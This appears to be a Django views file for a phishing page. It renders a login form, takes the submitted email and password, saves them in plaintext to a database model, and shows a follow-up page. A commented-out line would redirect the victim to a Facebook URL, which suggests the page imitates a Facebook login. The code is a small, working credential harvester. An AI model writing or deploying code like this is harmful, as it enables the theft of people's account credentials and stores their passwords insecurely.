from django.shortcuts import render, redirect
from django.http import HttpResponse, FileResponse
from .models import Data

import os


# Create your views here.
def main(request):
    if request.method == "GET":
        return render(request, "index.html")
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("pw")
        data = Data(username=email, pw=password)
        data.save()
        # return redirect("https://www.facebook.com/wfed/edfw")
        return render(request, "not.html")
